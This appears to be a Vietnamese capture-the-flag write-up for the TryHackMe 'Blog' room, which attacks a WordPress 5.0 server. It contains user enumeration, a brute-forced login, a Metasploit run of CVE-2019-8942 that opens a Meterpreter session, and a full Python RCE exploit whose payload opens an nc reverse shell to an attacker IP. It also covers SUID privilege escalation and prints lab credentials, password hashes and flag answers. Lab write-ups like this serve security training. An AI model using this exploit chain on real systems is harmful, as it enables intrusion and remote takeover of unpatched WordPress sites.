tri\u1ec3n khai b\u1edfi WordPress Ti\u1ebfn h\u00e0nh scan port v\u00e0 url th\u00f4ng qua nmap v\u00e0 gobuster K\u1ebft qu\u1ea3 t\u1eeb nmap Terminal PORT STATE SERVICE 22 / tcp open | filtered ssh 80 / tcp open | filtered http 139 / tcp open | filtered netbios-ssn 445 / tcp open | filtered microsoft-ds T\u1eeb k\u1ebft qu\u1ea3 nmap, ta nh\u1eadn \u0111\u01b0\u1ee3c 4 c\u1ed5ng k\u1ebft n\u1ed1i g\u1ed3m 2 c\u1ed5ng cho smb v\u00e0 1 c\u1ed5ng ssh, 1 c\u1ed5ng http M\u1ed9t ph\u1ea7n k\u1ebft qu\u1ea3 t\u1eeb gobuster Terminal / rss ( Status : 301 ) [ Size : 0 ] [--> http :// 10 . 10 . 184 . 240 / feed /] / login ( Status : 302 ) [ Size : 0 ] [--> http :// blog . thm / wp-login . php ] / 0 ( Status : 301 ) [ Size : 0 ] [--> http :// 10 . 10 . 184 . 240 / 0 /] / feed ( Status : 301 ) [ Size : 0 ] [--> http :// 10 . 10 . 184 . 240 / feed /] / atom ( Status : 301 ) [ Size : 0 ] [--> http :// 10 . 10 . 184 . 240 / feed / atom /] / wp-content ( Status : 301 ) [ Size : 315 ] [--> http :// 10 . 10 . 184 . 240 / wp-content /] / admin ( Status : 302 ) [ Size : 0 ] [--> http :// blog . thm / wp-admin /] / rss2 ( Status : 301 ) [ Size : 0 ] [--> http :// 10 . 10 . 184 . 240 / feed /] / wp-includes ( Status : 301 ) [ Size : 316 ] [--> http :// 10 . 10 . 184 . 240 / wp-includes /] / rdf ( Status : 301 ) [ Size : 0 ] [--> http :// 10 . 10 . 184 . 240 / feed / rdf /] / page1 ( Status : 301 ) [ Size : 0 ] [--> http :// 10 . 10 . 184 . 240 /] / ' ( Status : 301 ) [ Size : 0 ] [--> http :// 10 . 10 . 184 . 240 /] / dashboard ( Status : 302 ) [ Size : 0 ] [--> http :// blog . thm / wp-admin /] V\u1edbi WordPress, ta c\u00f3 c\u00f4ng c\u1ee5 WPScan d\u00f9ng \u0111\u1ec3 scan nhanh l\u1ed7 h\u1ed5ng c\u00f3 \u0111\u01b0\u1ee3c (t\u1ea1i wordpress nhi\u1ec1u l\u1ed7 h\u1ed5ng qu\u00e1 :V) Terminal _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____ | \\ \\ /\\ / /| | __ ) | ( ___ ___ __ _ _ __ \u00ae \\ \\/ \\/ / | ___ / \\ ___ \\ / __ |/ _ ` | '_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.24 Sponsored by Automattic - https://automattic.com/ @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [+] URL: http://10.10.184.240/ [10.10.184.240] [+] Started: HIDDEN Interesting Finding(s): [+] Headers | Interesting Entry: Server: Apache/2.4.29 (Ubuntu) | Found By: Headers (Passive Detection) | Confidence: 100% [+] robots.txt found: http://10.10.184.240/robots.txt | Interesting Entries: | - /wp-admin/ | - /wp-admin/admin-ajax.php | Found By: Robots Txt (Aggressive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://10.10.184.240/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.wordpress.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ [+] WordPress readme found: http://10.10.184.240/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] Upload directory has listing enabled: http://10.10.184.240/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100% [+] The external WP-Cron seems to be enabled: http://10.10.184.240/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-wordpress-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 5.0 identified (Insecure, released on 2018-12-06). | Found By: Emoji Settings (Passive Detection) | - http://10.10.184.240/, Match: ' wp-includes \\/ js \\/ wp-emoji-release . min . js ? ver = 5 . 0 ' | Confirmed By: Meta Generator (Passive Detection) | - http://10.10.184.240/, Match: ' WordPress 5 . 0 ' [i] The main theme could not be detected . [+] Enumerating Users ( via Passive and Aggressive Methods ) Brute Forcing Author IDs - Time : 00 : 00 : 01 <==============================================================================================================================================================> ( 10 / 10 ) 100 . 00 % Time : 00 : 00 : 01 [i] User ( s ) Identified : [+] bjoel | Found By : Wp Json Api ( Aggressive Detection ) | - http :// 10 . 10 . 184 . 240 / wp-json / wp / v2 / users / ? per_page = 100 & page = 1 | Confirmed By : | Author Id Brute Forcing - Author Pattern ( Aggressive Detection ) | Login Error Messages ( Aggressive Detection ) [+] kwheel | Found By : Wp Json Api ( Aggressive Detection ) | - http :// 10 . 10 . 184 . 240 / wp-json / wp / v2 / users / ? per_page = 100 & page = 1 | Confirmed By : | Author Id Brute Forcing - Author Pattern ( Aggressive Detection ) | Login Error Messages ( Aggressive Detection ) [+] Karen Wheeler | Found By : Rss Generator ( Aggressive Detection ) [+] Billy Joel | Found By : Rss Generator ( Aggressive Detection ) [!] No WPScan API Token given , as a result vulnerability data has not been output . [!] You can get a free API token with 25 daily requests by registering at https :// wpscan . com / register T\u1eeb k\u1ebft qu\u1ea3 tr\u00ean, ta th\u1ea5y r\u1eb1ng WPScan t\u00ecm \u0111\u01b0\u1ee3c 2 user l\u00e0 bjoel v\u00e0 kwheel, t\u1eeb \u0111\u00e2y ta brute force th\u1eed v\u00e0o trang login c\u1ee7a website blog.thm D\u00f9ng hydra ho\u1eb7c burpsuite ho\u1eb7c b\u1ea5t c\u1ee9 tool n\u00e0o kh\u00e1c \u0111\u1ec3 brute force password. Ch\u1eafc ch\u1eafn s\u1ebd ra Nooooo username: kwheel password: cutiepie1 V\u00e0o \u0111\u01b0\u1ee3c trang qu\u1ea3n l\u00ed r\u1ed3i :V Trang qu\u1ea3n l\u00ed Ta th\u1ea5y trang qu\u1ea3n l\u00ed s\u1eed d\u1ee5ng WordPress 5.0, ta d\u00f9ng searchsploit \u0111\u1ec3 t\u00ecm ki\u1ebfm l\u1ed7 h\u1ed5ng c\u00f3 th\u1ec3 khai th\u00e1c t\u1eeb \u0111\u00e2y K\u1ebft qu\u1ea3 c\u1ee7a searchsploit Nh\u00ecn k\u1ebft qu\u1ea3 tr\u00ean ta th\u1ea5y \u0111\u01b0\u1ee3c l\u1ed7 h\u1ed5ng Image Remote Code Execution thu\u1ed9c CVE-2019-8942 Init Access \u00b6 Metasploit \u00b6 T\u1eeb ph\u1ea7n tr\u00ean ta c\u00f3 2 h\u01b0\u1edbng khai th\u00e1c b\u1eb1ng Metasploit Terminal msf6 exploit ( multi / http / wp_crop_rce ) > options Module options ( exploit / multi / http / wp_crop_rce ): Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD cutiepie1 yes The WordPress password to authenticate with Proxies no A proxy chain of format type : host : port [, type : host : port ][...] RHOSTS 10 . 10 . 184 . 240 yes The target host ( s ), see https :// docs . metasploit . com / docs / using-metasploit / basics / using-metasploit . html RPORT 80 yes The target port ( TCP ) SSL false no Negotiate SSL / TLS for outgoing connections TARGETURI / yes The base path to the wordpress application THEME_DIR no The WordPress theme dir name ( disable theme auto-detection if provided ) USERNAME kwheel yes The WordPress username to authenticate with VHOST no HTTP server virtual host Options Terminal msf6 exploit ( multi / http / wp_crop_rce ) > exploit [*] Started reverse TCP handler on 10 . 18 . 80 . 57 : 443 [*] Authenticating with WordPress using kwheel : cutiepie1 ... [+] Authenticated with WordPress [*] Preparing payload ... [*] Uploading payload [+] Image uploaded [*] Including into theme [*] Sending stage ( 39927 bytes ) to 10 . 10 . 184 . 240 [*] Meterpreter session 1 opened ( 10 . 18 . 80 . 57 : 443 -> 10 . 10 . 184 . 240 : 54232 ) at 2023 - 08 - 27 09 : 21 : 20 - 0400 [*] Attempting to clean up files ... Terminal meterpreter > shell Process 1834 created . Channel 1 created . Terminal python -c 'import pty;pty.spawn (\"/bin/bash\");' www-data @blog :/ var / www / wordpress $ Cu\u1ed1i c\u00f9ng c\u0169ng \u0111\u00e3 th\u00e0nh c\u00f4ng b\u01b0\u1edbc \u0111\u1ea7u c\u1ee7a vi\u1ec7c th\u00e2m nh\u1eadp h\u1ec7 th\u1ed1ng. Python script \u00b6 Nh\u00ecn l\u1ea1i searchsploit n\u00e0o, ta c\u00f3 th\u1ec3 d\u00f9ng python (file 49512.py) \u0111\u1ec3 khai th\u00e1c l\u1ed7 h\u1ecfng Image Remote Code Excution tr\u00ean WordPress 5.0 H\u00ecnh \u1ea3nh m\u00f4 t\u1ea3 k\u1ebft qu\u1ea3 searchsploit 49512.py # Exploit Title: WordPress 5.0.0 - Image Remote Code Execution # Date: 2020-02-01 # Exploit Authors: OUSSAMA RAHALI ( aka V0lck3r) # Discovery Author : RIPSTECH Technology # Version: WordPress 5.0.0 and <= 4.9.8 . # References : CVE-2019-89242 | CVE-2019-89242 | https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/ #/usr/bin/env python3 import requests import re import sys from datetime import datetime banner = \"\"\" __ __ _ ____ ____ _____ \\ \\ / /__ _ __ __| |_ __ _ __ ___ ___ ___ | _ \\ / ___| ____| \\ \\ /\\ / / _ \\| '__/ _` | '_ \\| '__/ _ \\/ __/ __| | |_) | | | _| \\ V V / (_) | | | (_| | |_) | | | __/\\__ \\__ \\ | _ <| |___| |___ \\_/\\_/ \\___/|_| \\__,_| .__/|_| \\___||___/___/ |_| \\_ \\\\ ____|_____| |_| 5.0.0 and <= 4.9.8 \"\"\" print ( banner ) print ( \"usage :\" ) print ( \"=======\" ) usage = 'python3 RCE_wordpress.py http://<IP>:<PORT>/ <Username> <Password> <WordPress_theme>' print ( usage ) url = sys . argv [ 1 ] username = sys . argv [ 2 ] password = sys . argv [ 3 ] wp_theme = sys . argv [ 4 ] # wpscan results lhost = '10.10.10.10' #attacker ip lport = '4141' #listening port date = str ( datetime . now () . strftime ( '%Y' )) + '/' + str ( datetime . now () . strftime ( '%m' )) + '/' imagename = 'gd.jpg' # ====== # Note : # ====== # It could be any jpg image, BUT there are some modifications first : # 1- image name as : \"gd.jpg\" # 2- place the image in the same directory as this exploit. # 3- inject the php payload via exiftool : exiftool gd.jpg -CopyrightNotice=\"<?=\\`\\$_GET[0]\\`?>\" data = { 'log' : username , 'pwd' : password , 'wp-submit' : 'Log In' , 'redirect_to' : url + 'wp-admin/' , 'testcookie' : 1 } r = requests . post ( url + 'wp-login.php' , data = data ) if r . status_code == 200 : print ( \"[+] Login successful. \\n \" ) else : print ( \"[-] Failed to login.\" ) exit ( 0 ) cookies = r . cookies print ( \"[+] Getting Wp Nonce ... \" ) res = requests . get ( url + 'wp-admin/media-new.php' , cookies = cookies ) wp_nonce_list = re . findall ( r 'name=\"_wpnonce\" value=\"(\\w+)\"' , res . text ) if len ( wp_nonce_list ) == 0 : print ( \"[-] Failed to retrieve the _wpnonce \\n \" ) exit ( 0 ) else : wp_nonce = wp_nonce_list [ 0 ] print ( \"[+] Wp Nonce retrieved successfully ! _wpnonce : \" + wp_nonce + \" \\n \" ) print ( \"[+] Uploading the image ... \" ) data = { 'name' : 'gd.jpg' , 'action' : 'upload-attachment' , '_wpnonce' : wp_nonce } image = { 'async-upload' : ( imagename , open ( imagename , 'rb' ))} r_upload = requests . post ( url + 'wp-admin/async-upload.php' , data = data , files = image , cookies = cookies ) if r_upload . status_code == 200 : image_id = re . findall ( r '{\"id\":(\\d+),' , r_upload . text )[ 0 ] _wp_nonce = re . findall ( r '\"update\":\"(\\w+)\"' , r_upload . text )[ 0 ] print ( '[+] Image uploaded successfully ! Image ID :' + image_id + \" \\n \" ) else : print ( \"[-] Failed to receive a response for uploaded image ! try again . \\n \" ) exit ( 0 ) print ( \"[+] Changing the path ... \" ) data = { '_wpnonce' : _wp_nonce , 'action' : 'editpost' , 'post_ID' : image_id , 'meta_input[_wp_attached_file]' : date + imagename + '?/../../../../themes/' + wp_theme + '/rahali' } res = requests . post ( url + 'wp-admin/post.php' , data = data , cookies = cookies ) if res . status_code == 200 : print ( \"[+] Path has been changed successfully. \\n \" ) else : print ( \"[-] Failed to change the path ! Make sure the theme is correcte . \\n \" ) exit ( 0 ) print ( \"[+] Getting Ajax nonce ... \" ) data = { 'action' : 'query-attachments' , 'post_id' : 0 , 'query[item]' : 43 , 'query[orderby]' : 'date' , 'query[order]' : 'DESC' , 'query[posts_per_page]' : 40 , 'query[paged]' : 1 } res = requests . post ( url + 'wp-admin/admin-ajax.php' , data = data , cookies = cookies ) ajax_nonce_list = re . findall ( r ',\"edit\":\"(\\w+)\"' , res . text ) if res . status_code == 200 and len ( ajax_nonce_list ) != 0 : ajax_nonce = ajax_nonce_list [ 0 ] print ( '[+] Ajax Nonce retrieved successfully ! ajax_nonce : ' + ajax_nonce + ' \\n ' ) else : print ( \"[-] Failed to retrieve ajax_nonce. \\n \" ) exit ( 0 ) print ( \"[+] Cropping the uploaded image ... \" ) data = { 'action' : 'crop-image' , '_ajax_nonce' : ajax_nonce , 'id' : image_id , 'cropDetails[x1]' : 0 , 'cropDetails[y1]' : 0 , 'cropDetails[width]' : 200 , 'cropDetails[height]' : 100 , 'cropDetails[dst_width]' : 200 , 'cropDetails[dst_height]' : 100 } res = requests . post ( url + 'wp-admin/admin-ajax.php' , data = data , cookies = cookies ) if res . status_code == 200 : print ( \"[+] Done . \\n \" ) else : print ( \"[-] Erorr ! Try again \\n \" ) exit ( 0 ) print ( \"[+] Creating a new post to include the image... \" ) res = requests . post ( url + 'wp-admin/post-new.php' , cookies = cookies ) if res . status_code == 200 : _wpnonce = re . findall ( r 'name=\"_wpnonce\" value=\"(\\w+)\"' , res . text )[ 0 ] post_id = re . findall ( r '\"post\":{\"id\":(\\w+),' , res . text )[ 0 ] print ( \"[+] Post created successfully . \\n \" ) else : print ( \"[-] Erorr ! Try again \\n \" ) exit ( 0 ) data = { '_wpnonce' : _wpnonce , 'action' : 'editpost' , 'post_ID' : post_id , 'post_title' : 'RCE poc by v0lck3r' , 'post_name' : 'RCE poc by v0lck3r' , 'meta_input[_wp_page_template]' : 'cropped-rahali.jpg' } res = requests . post ( url + 'wp-admin/post.php' , data = data , cookies = cookies ) if res . status_code == 200 : print ( \"[+] POC is ready at : \" + url + '?p=' + post_id + '&0=id \\n ' ) print ( \"[+] Executing payload !\" ) requests . get ( f \" { url } ?p= { post_id } &0=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20 { lhost } %20 { lport } %20%3E%2Ftmp%2Ff\" , cookies = cookies ) else : print ( \"[-] Erorr ! Try again (maybe change the payload) \\n \" ) exit ( 0 ) Privilege Escalation \u00b6 Nh\u01b0 th\u01b0\u1eddng l\u1ec7, th\u00ec m\u00f3n khai v\u1ecb ph\u1ea3i l\u00e0 ki\u1ec3m tra quy\u1ec1n sudo (c\u00e1i n\u00e0y b\u1ecf qua v\u00ec l\u00e0m g\u00ec c\u00f3 password c\u1ee7a www-data) v\u00e0 suid find / -user root -perm /4000 -type f 2>/dev/null m\u1ed9t ph\u1ea7n k\u1ebft qu\u1ea3 c\u1ee7a vi\u1ec7c xem suid T\u1eeb h\u00ecnh \u1ea3nh tr\u00ean ta th\u1ea5y m\u1ed9t file l\u1ea1i l\u00e0 checker \u1edf /usr/sbin Ta s\u1ebd th\u1eed ki\u1ec3m tra file checker \u0110\u1eebng c\u00f3a xem T\u1ea1i m\u00e1y victim: Th\u1ef1c thi l\u1ea7n l\u01b0\u1ee3t Terminal cd / usr / sbin python3 -m http . server T\u1ea1i m\u00e1y attacker: Th\u1ef1c thi wget http://blog.thm:8000/checker K\u1ebft qu\u1ea3 n\u1ed9i dung h\u00e0m main T\u1eeb h\u00ecnh \u1ea3nh tr\u00ean, ta th\u1ea5y file n\u00e0y c\u00f3 ch\u1ee9c n\u0103ng ki\u1ec3m tra bi\u1ebfn m\u00f4i tr\u01b0\u1eddng c\u00f3 t\u00ean admin \u0111\u00e3 \u0111\u01b0\u1ee3c \u0111\u1eb7t gi\u00e1 tr\u1ecb hay ch\u01b0a, n\u1ebfu ch\u01b0a th\u00ec s\u1ebd kh\u00f4ng c\u00f3 quy\u1ec1n admin c\u00f2n n\u1ebfu \u0111\u00e3 \u0111\u1eb7t th\u00ec s\u1ebd c\u00f3 quy\u1ec1n admin (t\u1ee9c set suid=0) C\u00f3 th\u1ec3 d\u00f9ng ghidra \u0111\u1ec3 xem ch\u01b0\u01a1ng tr\u00ecnh m\u1ed9t c\u00e1ch t\u1ed5ng qu\u00e1t h\u01a1n Ro\u00e0i t\u1eeb \u0111\u00e2y, ta s\u1ebd \u0111\u1eb7t gi\u00e1 tr\u1ecb cho bi\u1ebfn admin v\u00e0 leo quy\u1ec1n root thoai :v V\u00ed d\u1ee5 admin=r /usr/sbin/checker Quy\u1ec1n root Ta \u0111\u01b0\u1ee3c to\u00e0n b\u1ed9 flag nh\u01b0 trong h\u00ecnh Flag Some problems \u00b6 T\u00f4i mu\u1ed1n chia s\u1ebb m\u1ed9t v\u00e0i \u0111i\u1ec1u v\u1ec1 challenge n\u00e0y. T\u00f4i \u0111\u00e3 l\u01b0\u1ee3t b\u1ecf nhi\u1ec1u v\u1ea5n \u0111\u1ec1 trong m\u1ea1ch ch\u00ednh c\u1ee7a k\u1ecbch b\u1ea3n tri\u1ec3n khai v\u00e0 s\u1ebd vi\u1ebft \u1edf t\u1ea1i \u0111\u00e2y. 139 445 \u00b6 V\u1edbi c\u00e1i t\u1ef1a \u0111\u1ec1 139 445 ch\u1eafc h\u1eb5n ta s\u1ebd ch\u00fa \u00fd \u0111\u1ebfn SMB D\u00e9, ta v\u1eabn c\u00f3 c\u00f4ng \u0111o\u1ea1n ki\u1ec3m tra SMB nh\u01b0 sau SMBMap T\u1eeb vi\u1ec7c ki\u1ec3m tra b\u1eb1ng smbmap, ta th\u1ea5y \u1ed5 disk BillySMB share v\u00e0 \u0111\u01b0\u1ee3c c\u1ea5p quy\u1ec1n \u0111\u1ecdc/ghi. Nh\u01b0ng l\u00e0m th\u1ebf n\u00e0o \u0111\u1ec3 v\u00e0o disk \u0111\u00f3 \u0111\u00e2y? Ta s\u1ebd d\u00f9ng c\u00f4ng c\u1ee5 enum4linux \u0111\u1ec3 xem \u0111\u01b0\u1eddng d\u1eabn Terminal Sau khi c\u00f3 \u0111\u01b0\u1eddng d\u1eabn r\u1ed3i, ta truy c\u1eadp b\u1eb1ng smbclient H\u00ecnh \u1ea3nh m\u00f4 t\u1ea3 vi\u1ec7c truy c\u1eadp th\u00e0nh c\u00f4ng SMB :3 get h\u1ebft 3 file v\u1ec1 m\u00e1y, xem c\u00f3 g\u00ec kh\u00f4ng nha (th\u00f4ng th\u01b0\u1eddng s\u1ebd c\u00f3 th\u1ec3 ch\u1ee9 nh\u1eefng th\u00f4ng tin c\u1ea7n thi\u1ebft \u0111\u00e3 \u0111\u01b0\u1ee3c \u1ea9n gi\u1ea5u trong file) Quan tr\u1ecdng h\u01a1n n\u1eefa, enum4linux cho ta bi\u1ebft \u0111\u01b0\u1ee3c h\u1ec7 th\u1ed1ng c\u00f3 H\u00ecnh \u1ea3nh cho k\u1ebft qu\u1ea3 c\u00f3 user bjoel wp-config.php \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 <?php /** * The base configuration for WordPress * * The wp-config.php creation script uses this file during the * installation. You don't have to use the web site, you can * copy this file to \"wp-config.php\" and fill in the values. * * This file contains the following configurations: * * * MySQL settings * * Secret keys * * Database table prefix * * ABSPATH * * @link https://codex.wordpress.org/Editing_wp-config.php * * @package WordPress */ /* Custom */ /* define('WP_HOME', '/'); define('WP_SITEURL', '/'); */ // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define ( 'DB_NAME' , 'blog' ); /** MySQL database username */ define ( 'DB_USER' , 'wordpressuser' ); /** MySQL database password */ define ( 'DB_PASSWORD' , 'LittleYellowLamp90!@' ); /** MySQL hostname */ define ( 'DB_HOST' , 'localhost' ); /** Database Charset to use in creating database tables. */ define ( 'DB_CHARSET' , 'utf8' ); /** The Database Collate type. Don't change this if in doubt. */ define ( 'DB_COLLATE' , '' ); /** Custom FS Method */ define ( 'FS_METHOD' , 'direct' ); /**#@+ * Authentication Unique Keys and Salts. * * Change these to different unique phrases! * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service} * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again. * * @since 2.6.0 */ define ( 'AUTH_KEY' , 'ZCgJQaT0(*+Zjo}Iualapeo|?~nMtp^1IUrquYx3!#T$ihW8F~_`L+$N E>J!Bm;' ); define ( 'SECURE_AUTH_KEY' , 'nz|(+d|| yVX-5_on76q%:M, ?{NVJ,Q(;p3t|_B*]-yQ&|]3}M@Po!f_,T-S4fe' ); define ( 'LOGGED_IN_KEY' , 'a&I&DR;PUnPKul^kLBgxYa@`g||{eZf><sf8SmKBi+R7`O?](SuL&/H#hqzO$_:3' ); define ( 'NONCE_KEY' , 'Vdd-zzB:/yxg6unZvng,oY-%Z V,i%+Uz_f)S;Efz!;cY3p~]T,g1z*Z[jXe>5Sm' ); define ( 'AUTH_SALT' , 'u+k8g;=jbe)6/X~<M1HwINhH(Tno@orx:$_$-#*id)ddBYGGF(]AP?}4?2E|m;5`' ); define ( 'SECURE_AUTH_SALT' , '>Rg5>,/^BywVg^A[Etqot:CoU+9<)YPM~h|)Ifd5!iK!L*5+JDiZi33KrYZNd2B7' ); define ( 'LOGGED_IN_SALT' , '3kpL-rcnU+>H#t/g>9<)j/u I1/-Ws;h6GrDQ>v8%7@C~`h1lBC/euttp)/8EdA_' ); define ( 'NONCE_SALT' , 'JEajZ)y?&.m-1^$(c-JX$zi0qv|7]F%7a6jh]P5SRs+%`*60?WJVk$><b$poQg9>' ); /**#@-*/ /** * WordPress Database Table prefix. * * You can have multiple installations in one database if you give each * a unique prefix. Only numbers, letters, and underscores please! */ $table_prefix = 'wp_' ; /** * For developers: WordPress debugging mode. * * Change this to true to enable the display of notices during development. * It is strongly recommended that plugin and theme developers use WP_DEBUG * in their development environments. * * For information on other constants that can be used for debugging, * visit the Codex. * * @link https://codex.wordpress.org/Debugging_in_WordPress */ define ( 'WP_DEBUG' , false ); /* That's all, stop editing! Happy blogging. */ /** Absolute path to the WordPress directory. */ if ( ! defined ( 'ABSPATH' ) ) define ( 'ABSPATH' , dirname ( __FILE__ ) . '/' ); /** Sets up WordPress vars and included files. */ require_once ( ABSPATH . 'wp-settings.php' ); T\u1eeb file config (b\u1ea3n ch\u1ea5t build WordPress th\u00ec s\u1ebd c\u00f3 file n\u00e0y) tr\u00ean, ta th\u1ea5y \u0111\u01b0\u1ee3c th\u00f4ng tin c\u1ee7a database, ta s\u1ebd ti\u1ebfn h\u00e0nh \u0111i\u1ec1u tra database v\u00ec m\u1ee5c \u0111\u00edch c\u1ee7a ta s\u1ebd l\u1ea5y password c\u1ee7a user bjoel. Nh\u01b0 ta \u0111\u00e3 khai th\u00e1c \u1edf ph\u1ea7n k\u1ecbch b\u1ea3n th\u00ec vi\u1ec7c t\u00ecm \u0111\u01b0\u1ee3c password c\u1ee7a user bjoel \u1edf ng\u1eef c\u1ea3nh challenge n\u00e0y s\u1ebd kh\u00f4ng th\u1ef1c s\u1ef1 c\u1ea7n thi\u1ebft c\u0169ng nh\u01b0 l\u00e0 c\u00f3 \u00edch cho ch\u00fang ta v\u1ec1 \u0111i\u1ec1u g\u00ec c\u1ea3 nh\u01b0ng t\u00f4i mu\u1ed1n \u0111\u1ec1 c\u1eadp \u1edf \u0111\u00e2y l\u00e0 s\u1ebd c\u00f3 th\u1ec3 t\u1ed3n t\u1ea1i 1 challenge n\u00e0o \u0111\u00f3 ho\u1eb7c t\u1ed1i thi\u1ec3u s\u1ebd m\u1edf ra m\u1ed9t h\u01b0\u1edbng /m\u1ed9t c\u00e1ch nh\u00ecn m\u1edbi \u0111\u1ed1i v\u1edbi c\u00f4ng vi\u1ec7c c\u1ee7a m\u1ed9t redteam thay v\u00ec pentester. Ti\u1ebfn h\u00e0nh v\u00e0o mysql b\u1eb1ng Terminal mysql - u wordpressuser - p LittleYellowLamp90 !@ use blog Xem th\u00f4ng tin user Terminal mysql > select * from wp_users select * from wp_users -> ; ; + ----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+ | ID | user_login | user_pass | user_nicename | user_email | user_url | user_registered | user_activation_key | user_status | display_name | + ----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+ | 1 | bjoel | $ P$BjoFHe8zIyjnQe / CBvaltzzC6ckPcO / | bjoel | nconkl1 @ outlook . com | | 2020 - 05 - 26 03 : 52 : 26 | | 0 | Billy Joel | | 3 | kwheel | $ P$BedNwvQ29vr1TPd80CDl6WnHyjr8te . | kwheel | zlbiydwrtfjhmuuymk @ ttirv . net | | 2020 - 05 - 26 03 : 57 : 39 | | 0 | Karen Wheeler | + ----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+ 2 rows in set ( 0 . 00 sec ) R\u1ed3i, ta th\u1ea5y \u0111\u01b0\u1ee3c 2 user l\u00e0 bjoel v\u00e0 kwheel v\u00e0 2 password \u0111\u00e3 \u0111\u01b0\u1ee3c b\u0103m B\u1ea1n c\u00f3 th\u1ec3 xem thu\u1eadt to\u00e1n b\u0103m t\u1ea1i /wp-includes/class-phpass.php \u0111\u1ed1i v\u1edbi ng\u1eef c\u1ea3nh challenge n\u00e0y ho\u1eb7c xem t\u1ea1i WordPress Xem xem xem T\u1ea1i sao ta c\u00f3 user kwheel tr\u00ean website WordPress nh\u01b0ng \u1edf m\u00e1y ch\u1ee7 th\u00ec kh\u00f4ng hi\u1ec7n use kwheel trong /home? V\u1ea5n \u0111\u1ec1 n\u1eb1m \u1edf \u0111\u00e2u? JTygChfpNf.php \u00b6 Nh\u00ecn h\u00ecnh b\u00ean d\u01b0\u1edbi ta th\u1ea5y c\u00f3 file l\u1ea1 mang t\u00ean JTygChfpNf.php File m\u01a1 h\u1ed3 Th\u00ec file n\u00e0y ch\u00ednh l\u00e0 file t\u1eeb Metasploit t\u1ea1o ra trong ph\u1ea7n k\u1ecbch b\u1ea3n ban n\u00e3y ch\u00fang ta tri\u1ec3n khai \u0111\u1ea5y. L\u00e0m vi\u1ec7c g\u00ec c\u0169ng ph\u1ea3i suy ngh\u0129, khi m\u00ecnh khai th\u00e1c Metasploit, th\u00ec ta n\u00ean bi\u1ebft \u0111\u01b0\u1ee3c h\u00e0nh vi c\u1ee7a n\u00f3 di\u1ec5n ra nh\u01b0 n\u00e0o v\u00e0 n\u00f3 \u0111\u00e3 ti\u00eam th\u1ee9 g\u00ec l\u00ean h\u1ec7 th\u1ed1ng. H\u01a1n n\u1eefa, c\u00e1i file nh\u01b0 th\u1ebf xu\u1ea5t hi\u1ec7n tr\u00ean h\u1ec7 th\u1ed1ng, li\u1ec7u BlueTeam c\u00f3 d\u1ec5 d\u00e0ng ph\u00e1t hi\u1ec7n kh\u00f4ng? Sourcecode c\u1ee7a file What we learned \u00b6 Config DNS Server through hosts file Learn about WordPress CVE-2019-8942 Privilege Escalation through SUID","title":"Blog"},{"location":"tryhackme/room/blog/#blog","text":"Room at https://tryhackme.com/room/blog List of the questions solved Question: root.txt 9a0b2b618bef9bfa7ac28c1353d9f318 Question: user.txt c8421899aae571f7af486492b71a8ab7 Question: Where was user.txt found? /media/usb Question: What CMS was Billy using? WordPress Question: What version of the above CMS was being used? 5.0","title":"Blog"},{"location":"tryhackme/room/blog/#pentest-scenario","text":"Host: 10.10.184.240 C\u00e0i \u0111\u1eb7t ban \u0111\u1ea7u: M\u1edf file hosts t\u1ea1i /etc/hosts Th\u00eam d\u00f2ng 10.10.184.240 blog.thm v\u00e0o cu\u1ed1i file L\u01b0u file Truy c\u1eadp website th\u00f4ng qua domain blog.thm","title":"Pentest scenario"},{"location":"tryhackme/room/blog/#reconnaissance","text":"Giao di\u1ec7n website \u0110\u00e2y l\u00e0 m\u1ed9t website \u0111\u01b0\u1ee3c tri\u1ec3n khai b\u1edfi WordPress Ti\u1ebfn h\u00e0nh scan port v\u00e0 url th\u00f4ng qua nmap v\u00e0 gobuster K\u1ebft qu\u1ea3 t\u1eeb nmap Terminal PORT STATE SERVICE 22 / tcp open | filtered ssh 80 / tcp open | filtered http 139 / tcp open | filtered netbios-ssn 445 / tcp open | filtered microsoft-ds T\u1eeb k\u1ebft qu\u1ea3 nmap, ta nh\u1eadn \u0111\u01b0\u1ee3c 4 c\u1ed5ng k\u1ebft n\u1ed1i g\u1ed3m 2 c\u1ed5ng cho smb v\u00e0 1 c\u1ed5ng ssh, 1 c\u1ed5ng http M\u1ed9t ph\u1ea7n k\u1ebft qu\u1ea3 t\u1eeb gobuster Terminal / rss ( Status : 301 ) [ Size : 0 ] [--> http 